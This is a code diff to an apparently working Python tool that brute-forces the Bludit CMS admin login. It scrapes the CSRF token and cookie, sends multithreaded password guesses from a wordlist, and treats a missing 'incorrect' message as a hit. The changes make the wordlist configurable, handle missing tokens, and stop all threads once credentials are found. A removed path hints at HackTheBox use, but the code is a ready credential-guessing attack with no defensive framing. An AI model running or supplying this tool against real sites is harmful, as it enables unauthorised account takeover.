@@ -18,11 +18,13 @@ check = False  # set true to check bludit version
 # user and pass can be a simple word or a path to a dictionary
 # warning: using large files can freeze your box. Experience talking
 userwordlist = "admin"
-passwordlist = "/home/th3g3ntl3man/.github/misRepo/hackthebox/wordlist.txt"
-
-threads = 30  # Elevated use of threads may need a greather timeout
+passwordlist = "wordlist.txt"
+threads = 20  # Elevated use of threads may need a greather timeout
 timeout = 30
+errmsg = "Username or password incorrect"  # error message in case of incorrect login attempt
 
+
+credentials = ""  # leave this variable empty
 
 wordlistpair = [userwordlist, passwordlist]
 for i in range(2):
@@ -51,14 +53,19 @@ def POST_request(HTTPHandler, head:dict, data, path):
     HTTPHandler.request("POST",path,body=data,headers=head)
     response = HTTPHandler.getresponse()
     info = response.read().decode()
-    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',info).group(1)
-    if research("Username or password incorrect",info) == None:
+    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',info)
+    if token == None:
+        print("\n[!] No token found...")
+    else:
+        token = token.group(1)
+    if research(errmsg,info) == None:
         return True
     else:
         return token
 
     
-def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/login"):    
+def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/login"):
+    global credentials
     HTTPHandler = client.HTTPConnection(server,port,timeout)
     HTTPHandler.connect()
     header = {
@@ -68,6 +75,8 @@ def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/lo
     }
     token,cookie = get_cookie_N_token(HTTPHandler,header,path)
     for password in passwordlist:
+        if len(credentials) > 0:
+            exit()
         bodydata="tokenCSRF={}&username={}&password={}&save=".format(token,username,password)    
         header = {
             "Host":server,
@@ -87,8 +96,10 @@ def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/lo
             break
             
         if token == True:
-            print("\n[!] FOUND: %-20s:%20s"%(username,password))
+            print(f"\n\n[!] FOUND: {username}:{password}")
+            credentials = "{}:{}".format(username,password)
             exit()
+
     HTTPHandler.close()
 
 pswdict = dict()
@@ -109,7 +120,10 @@ for user in userwordlist:
     for pswr in pswdict.keys():
         x = threading.Thread(target=MainFunction, args=(user,pswdict[pswr],server,port,timeout,path))
         x.start()
-    while threading.active_count() > 1:
-        sleep(3)
+    try:
+        while threading.active_count() > 1:
+            sleep(3)
+    except:
+        credentials="FALSE"
         
 print("\n[*] Finished...")
